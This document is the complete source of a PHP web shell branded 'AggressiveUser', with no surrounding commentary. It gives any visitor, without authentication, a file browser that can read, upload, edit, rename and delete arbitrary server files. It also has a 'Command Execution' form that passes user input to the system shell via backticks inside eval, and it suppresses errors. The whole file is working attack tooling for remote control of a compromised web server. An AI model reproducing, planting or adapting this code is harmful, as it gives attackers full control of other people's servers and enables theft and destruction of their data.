<?php set_time_limit(0);error_reporting(0);echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>AggressiveUser 👻</title>
<style>
a{
color: #000000;
text-decoration: none;
}
</style>
</HEAD>
<BODY>
<br>
<table width="700" border="1" cellpadding="3" cellspacing="0" align="center" style="background-color: #999999;"  >
<tr><td>Current Path : ';if(isset($_GET['path'])){$path=$_GET['path'];}else{$path=getcwd();}$path=str_replace('\\','/',$path);$paths=explode('/',$path);foreach($paths as $id=>$pat){if($pat==''&&$id==0){$a=true;echo '<a href="?path=/">/</a>';continue;}if($pat=='')continue;echo '<a href="?path=';for($i=0;$i<=$id;$i++){echo"$paths[$i]";if($i!=$id)echo "/";}echo '">'.$pat.'</a>/';}echo '</td></tr><tr><td>';if(isset($_FILES['file'])){if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){echo '<font color="green">File Upload Successful</font><br />';}else{echo '<font color="red">File Upload Failed</font><br />';}}echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form> </td></tr><tr><td><form action="" method="POST"><label>Command Execution 👽:</label><input type="text" name="_"><input type="submit" value="Run"></form>
</td></tr>';if(isset($_GET['filesrc'])){echo "<tr><td>Current File : ";echo $_GET['filesrc'];echo '</tr></td></table><br />';echo('<center><textarea cols=80 rows=20>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');}elseif(isset($_GET['option'])&&$_POST['opt']!='delete'){echo '</table><br /><center>'.$_POST['path'].'<br /><br />';if($_POST['opt']=='rename'){if(isset($_POST['newname'])){if(rename($_POST['path'],$path.'/'.$_POST['newname'])){echo '<font color="green">Rename Successful</font><br />';}else{echo '<font color="red">Rename Failed</font><br />';}$_POST['name']=$_POST['newname'];}echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';}elseif($_POST['opt']=='edit'){if(isset($_POST['src'])){$fp=fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<font color="green">File Edit Successful</font><br />';}else{echo '<font color="red">File Edit Failed</font><br />';}fclose($fp);}echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';}echo '</center>';}else{echo '</table><br /><center>';if(isset($_GET['option'])&&$_POST['opt']=='delete'){if($_POST['type']=='dir'){if(rmdir($_POST['path'])){echo '<font color="green">Delete Directory Successful</font><br />';}else{echo '<font color="red">Delete Directory Failed</font><br />';}}elseif($_POST['type']=='file'){if(unlink($_POST['path'])){echo '<font color="green">Delete File Done.</font><br />';}else{echo '<font color="red">Delete File Error.</font><br />';}}}echo '</center>';if(isset($_POST['_'])){echo'<center><textarea readonly cols=97 rows=10>';eval('?>'.`$_POST[_]`);echo '</textarea><br><br>';};$scandir=scandir($path);echo '<table width="700" border="1" align="center" style="background-color: #999999;">
<tr>
<td style="background-color: black;"><center><font color=white>Name</center></td>
<td style="background-color: black;"><center><font color=white>Size</center></td>
<td style="background-color: black;"><center><font color=white>Actions</center></td>
</tr>';foreach($scandir as $dir){if(!is_dir("$path/$dir")||$dir=='.'||$dir=='..')continue;echo"<tr>
<td>📁 <a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"rename\">Rename</option>
<option value=\"delete\">Delete</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\"Go\" />
</form></center></td>
</tr>";}echo '<tr style="background-color: black;"><td></td><td></td><td></td></tr>';foreach($scandir as $file){if(!is_file("$path/$file"))continue;$size=filesize("$path/$file")/1024;$size=round($size,3);if($size>=1024){$size=round($size/1024,2).' MB';}else{$size=$size.' KB';}echo"<tr>
<td>📑 <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"edit\">Edit</option>
<option value=\"delete\">Delete</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\"Go\" />
</form></center></td>
</tr>";}echo '</table><br><table width="700" border="1" cellpadding="3" cellspacing="0" align="center">
<tr><td style="background-color: black; text-align: center; color: white;" >Developed by AggressiveUser 😡';} ?>
